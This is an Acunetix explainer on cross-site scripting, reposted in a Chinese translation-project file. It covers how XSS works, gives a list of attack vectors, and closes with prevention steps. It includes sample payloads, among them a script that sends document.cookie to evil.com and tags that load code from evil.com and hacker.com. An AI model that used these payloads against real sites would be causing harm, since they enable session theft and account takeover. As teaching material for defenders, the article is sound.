> * 原文地址：[Cross-site Scripting (XSS)](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
> * 原文作者：[Acunetix](https://www.acunetix.com/)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/article/2021/cross-site-scripting.md](https://github.com/xitu/gold-miner/blob/master/article/2021/cross-site-scripting.md)
> * 译者：
> * 校对者：

# Cross-site Scripting (XSS)

Cross-site Scripting (XSS) is a client-side code [injection attack](https://www.acunetix.com/blog/articles/injection-attacks/). The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments.

A web page or web application is vulnerable to XSS if it uses unsanitized user input in the output that it generates. This user input must then be parsed by the victim’s browser. XSS attacks are possible in VBScript, ActiveX, Flash, and even CSS. However, they are most common in JavaScript, primarily because JavaScript is fundamental to most browsing experiences.

![XSS](https://www.acunetix.com/wp-content/uploads/2019/02/xss.jpg)

## “Isn’t Cross-site Scripting the User’s Problem?”

If an attacker can abuse an XSS vulnerability on a web page to execute arbitrary JavaScript in a user’s browser, the security of that vulnerable website or vulnerable web application and its users has been compromised. XSS is not the user’s problem like any other security vulnerability. If it is affecting your users, it affects you.

Cross-site Scripting may also be used to [deface a website](https://www.acunetix.com/blog/news/full-disclosure-high-profile-websites-xss/) instead of targeting the user. The attacker can use injected scripts to change the content of the website or even redirect the browser to another web page, for example, one that contains malicious code.

## What Can the Attacker Do with JavaScript?

XSS vulnerabilities are perceived as less dangerous than for example [SQL Injection](https://www.acunetix.com/websitesecurity/sql-injection/) vulnerabilities. Consequences of the ability to execute JavaScript on a web page may not seem dire at first. Most web browsers run JavaScript in a very tightly controlled environment. JavaScript has limited access to the user’s operating system and the user’s files. However, JavaScript can still be dangerous if misused as part of malicious content:

* Malicious JavaScript has access to all the objects that the rest of the web page has access to. This includes access to the user’s cookies. Cookies are often used to store session tokens. If an attacker can obtain a user’s session cookie, they can impersonate that user, perform actions on behalf of the user, and gain access to the user’s sensitive data.
* JavaScript can read the browser DOM and make arbitrary modifications to it. Luckily, this is only possible within the page where JavaScript is running.
* JavaScript can use the `XMLHttpRequest` object to send HTTP requests with arbitrary content to arbitrary destinations.
* JavaScript in modern browsers can use HTML5 APIs. For example, it can gain access to the user’s geolocation, webcam, microphone, and even specific files from the user’s file system. Most of these APIs require user opt-in, but the attacker can use social engineering to go around that limitation.

The above, in combination with social engineering, allow criminals to pull off advanced attacks including cookie theft, planting trojans, keylogging, phishing, and identity theft. XSS vulnerabilities provide the perfect ground to escalate attacks to more serious ones. Cross-site Scripting can also be used in conjunction with other types of attacks, for example, [Cross-Site Request Forgery (CSRF)](https://www.acunetix.com/websitesecurity/csrf-attacks/).

There are several types of Cross-site Scripting attacks: [stored/persistent XSS](https://www.acunetix.com/blog/articles/persistent-xss/), [reflected/non-persistent XSS](https://www.acunetix.com/blog/articles/non-persistent-xss/), and [DOM-based XSS](https://www.acunetix.com/blog/articles/dom-xss-explained/). You can read more about them in an article titled [Types of XSS](https://www.acunetix.com/websitesecurity/xss/).

## How Cross-site Scripting Works

There are two stages to a typical XSS attack:

1. To run malicious JavaScript code in a victim’s browser, an attacker must first find a way to inject malicious code (payload) into a web page that the victim visits.
2. After that, the victim must visit the web page with the malicious code. If the attack is directed at particular victims, the attacker can use social engineering and/or phishing to send a malicious URL to the victim.

For step one to be possible, the vulnerable website needs to directly include user input in its pages. An attacker can then insert a malicious string that will be used within the web page and treated as source code by the victim’s browser. There are also variants of XSS attacks where the attacker lures the user to visit a URL using social engineering and the payload is part of the link that the user clicks.

The following is a snippet of server-side pseudocode that is used to display the most recent comment on a web page:

```python
print "<html>"
print "<h1>Most recent comment</h1>"
print database.latestComment
print "</html>"
```

The above script simply takes the latest comment from a database and includes it in an HTML page. It assumes that the comment printed out consists of only text and contains no HTML tags or other code. It is vulnerable to XSS, because an attacker could submit a comment that contains a malicious payload, for example:

```html
<script>doSomethingEvil();</script>
```

The web server provides the following HTML code to users that visit this web page:

```html
<html>
<h1>Most recent comment</h1>
<script>doSomethingEvil();</script>
</html>
```

When the page loads in the victim’s browser, the attacker’s malicious script executes. Most often, the victim does not realize it and is unable to prevent such an attack.

## Stealing Cookies Using XSS

Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways. One of them is to execute the following client-side script in the victim’s browser:

```html
<script>
window.location="http://evil.com/?cookie=" + document.cookie
</script>
```

The figure below illustrates a step-by-step walkthrough of a simple XSS attack.

![Cross site scripting](https://www.acunetix.com/wp-content/uploads/2012/10/how-xss-works-910x404.png)

1. The attacker injects a payload into the website’s database by submitting a vulnerable form with malicious JavaScript content.
2. The victim requests the web page from the web server.
3. The web server serves the victim’s browser the page with attacker’s payload as part of the HTML body.
4. The victim’s browser executes the malicious script contained in the HTML body. In this case, it sends the victim’s cookie to the attacker’s server.
5. The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives at the server.
6. The attacker can now use the victim’s stolen cookie for impersonation.

To learn more about how XSS attacks are conducted, you can refer to an article titled [A comprehensive tutorial on cross-site scripting](https://excess-xss.com/).

## Cross-site Scripting Attack Vectors

The following is a list of common XSS attack vectors that an attacker could use to compromise the security of a website or web application through an XSS attack. A more extensive list of XSS payload examples is maintained by the OWASP organization: [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).

### `<script>` tag

The `<script>` tag is the most straightforward XSS payload. A `script` tag can reference external JavaScript code or you can embed the code within the `script` tag itself.

```html
<!-- External script -->
<script src=http://evil.com/xss.js></script>
<!-- Embedded script -->
<script> alert("XSS"); </script>
```

### JavaScript events

JavaScript event attributes such as `onload` and `onerror` can be used in many different tags. This is a very popular XSS attack vector.

```html
<!-- onload attribute in the <body> tag -->
<body onload=alert("XSS")>
```

### `<body>` tag

An XSS payload can be delivered inside the `<body>` by using event attributes (see above) or other more obscure attributes such as the `background` attribute.

```html
<!-- background attribute -->
<body background="javascript:alert("XSS")">
```

### `<img>` tag

Some browsers execute JavaScript found in the `<img>` attributes.

```html
<!-- <img> tag XSS -->
<img src="javascript:alert("XSS");">
<!--  tag XSS using lesser-known attributes -->
<img dynsrc="javascript:alert('XSS')">
<img lowsrc="javascript:alert('XSS')">
```

### `<iframe>` tag

The `<iframe>` tag lets you embed another HTML page in the current page. An IFrame may contain JavaScript but JavaScript in the IFrame does not have access to the DOM of the parent page due to the Content Security Policy (CSP) of the browser. However, IFrames are still very effective for pulling off phishing attacks.

```html
<!-- <iframe> tag XSS -->
<iframe src="http://evil.com/xss.html">
```

### `<input>` tag

In some browsers, if the `type` attribute of the `<input>` tag is set to `image`, it can be manipulated to embed a script.

```html
<!-- <input> tag XSS -->
<input type="image" src="javascript:alert('XSS');">
```

### `<link>` tag

The `<link>` tag, which is often used to link to external style sheets, may contain a script.

```html
<!-- <link> tag XSS -->
<link rel="stylesheet" href="javascript:alert('XSS');">
```

### `<table>` tag

The background attribute of the `<table>` and `<td>` tags can be exploited to refer to a script instead of an image.

```html
<!-- <table> tag XSS -->
<table background="javascript:alert('XSS')">
<!-- <td> tag XSS -->
<td background="javascript:alert('XSS')">
```

### `<div>` tag

The `<div>` tag, similar to the <table> and `<td>` tags, can also specify a background and therefore embed a script.

```html
<!-- <div> tag XSS -->
<div style="background-image: url(javascript:alert('XSS'))">
<!-- <div> tag XSS -->
<div style="width: expression(alert('XSS'));">
```

### `<object>` tag

The `<object> tag` can be used to include a script from an external site.

```html
<!-- <object> tag XSS -->
<object type="text/x-scriptlet" data="http://hacker.com/xss.html">
```

## Is Your Website or Web Application Vulnerable to Cross-site Scripting

Cross-site Scripting vulnerabilities are one of the most common web application vulnerabilities. The OWASP organization (Open Web Application Security Project) lists XSS vulnerabilities in their [OWASP Top 10 2017](https://www.acunetix.com/blog/articles/owasp-top-10-2017/) document as the second most prevalent issue.

Fortunately, it’s easy to test if your website or web application is vulnerable to XSS and other vulnerabilities by running an automated web scan using the Acunetix [vulnerability scanner](https://www.acunetix.com/vulnerability-scanner/), which includes a specialized XSS scanner module. [Take a demo](https://www.acunetix.com/web-vulnerability-scanner/demo/) and find out more about running XSS scans against your website or web application. An example of how you can detect blind XSS vulnerabilities with Acunetix is available in the following article: [How to Detect Blind XSS Vulnerabilities](https://www.acunetix.com/websitesecurity/detecting-blind-xss-vulnerabilities/).

## How to Prevent XSS

To keep yourself safe from XSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code.

For more details, refer to the following articles: [Preventing XSS Attacks](https://www.acunetix.com/blog/articles/preventing-xss-attacks/) and [How to Prevent DOM-based Cross-site Scripting](https://www.acunetix.com/blog/web-security-zone/how-to-prevent-dom-based-cross-site-scripting/). You can also find useful information in the [XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) maintained by the OWASP organization.

## How to Prevent Cross-site Scripting (XSS) – Generic Tips

Preventing Cross-site Scripting (XSS) is not easy. Specific prevention techniques depend on the subtype of XSS vulnerability, on user input usage context, and on the programming framework. However, there are certain general strategic principles that you should follow to keep your web application safe.

### Step 1: Train and maintain awareness

To keep your web application safe, everyone involved in building the web application must be aware of the risks associated with XSS vulnerabilities. You should provide suitable security training to all your developers, QA staff, DevOps, and SysAdmins. You can start by referring them to this page.

### Step 2: Don’t trust any user input

Treat all user input as untrusted. Any user input that is used as part of HTML output introduces a risk of an XSS. Treat input from authenticated and/or internal users the same way that you treat public input.

### Step 3: Use escaping/encoding

Use an appropriate escaping/encoding technique depending on where user input is to be used: HTML escape, JavaScript escape, CSS escape, URL escape, etc. Use existing libraries for escaping, don’t write your own unless absolutely necessary.

### Step 4: Sanitize HTML

If the user input needs to contain HTML, you can’t escape/encode it because it would break valid tags. In such cases, use a trusted and verified library to parse and clean HTML. Choose the library depending on your development language, for example, HtmlSanitizer for .NET or SanitizeHelper for Ruby on Rails.

### Step 5: Set the HttpOnly flag

To mitigate the consequences of a possible XSS vulnerability, set the HttpOnly flag for cookies. If you do, such cookies will not be accessible via client-side JavaScript.

### Step 6: Use a Content Security Policy

To mitigate the consequences of a possible XSS vulnerability, also use a Content Security Policy (CSP). CSP is an HTTP response header that lets you declare the dynamic resources that are allowed to load depending on the request source.

### Step 7: Scan regularly

XSS vulnerabilities may be introduced by your developers or through external libraries/modules/software. You should regularly scan your web applications using a web vulnerability scanner such as Acunetix. If you use Jenkins, you should install the Acunetix plugin to automatically scan every build.

## Frequently asked questions

**How does Cross-site Scripting work?**

In a Cross-site Scripting attack (XSS), the attacker uses your vulnerable web page to deliver malicious JavaScript to your user. The user’s browser executes this malicious JavaScript on the user’s computer. Note that about one in three websites is vulnerable to Cross-site scripting.

[Learn more about the current state of web security](https://www.acunetix.com/acunetix-web-application-vulnerability-report/).

**Why is Cross-site Scripting dangerous?**

Even though a Cross-site Scripting attack happens in the user’s browser, it may affect your website or web application. For example, an attacker may use it to steal user credentials and log in to your website as that user. If that user is an administrator, the attacker gains control over your website.

[See an example of a dangerous XSS attack from the past](https://www.acunetix.com/blog/articles/dangerous-xss-vulnerability-found-on-youtube-the-vulnerability-explained/)

**How to discover Cross-site Scripting?**

To discover Cross-site Scripting, you may either perform manual penetration testing or first use a vulnerability scanner. If you use a vulnerability scanner, it will save you a lot of time and money because your penetration testers can then focus on more challenging vulnerabilities.

[Find out why it’s good to scan for vulnerabilities before hiring pen testers](https://www.acunetix.com/blog/web-security-zone/penetration-testing-vs-vulnerability-scanning/).

**How to protect against Cross-site Scripting?**

To protect against Cross-site Scripting, you must scan your website or web application regularly or at least after every chance in the code. Then, your developers must correct the code to eliminate the vulnerability. Contrary to popular opinions, web application firewalls do not protect against Cross-site Scripting, they just make the attack more difficult – the vulnerability is still there.

> 如果发现译文存在错误或其他需要改进的地方，欢迎到 [掘金翻译计划](https://github.com/xitu/gold-miner) 对译文进行修改并 PR，也可获得相应奖励积分。文章开头的 **本文永久链接** 即为本文在 GitHub 上的 MarkDown 链接。

---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[区块链](https://github.com/xitu/gold-miner#区块链)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计)、[人工智能](https://github.com/xitu/gold-miner#人工智能)等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)、[官方微博](http://weibo.com/juejinfanyi)、[知乎专栏](https://zhuanlan.zhihu.com/juejinfanyi)。
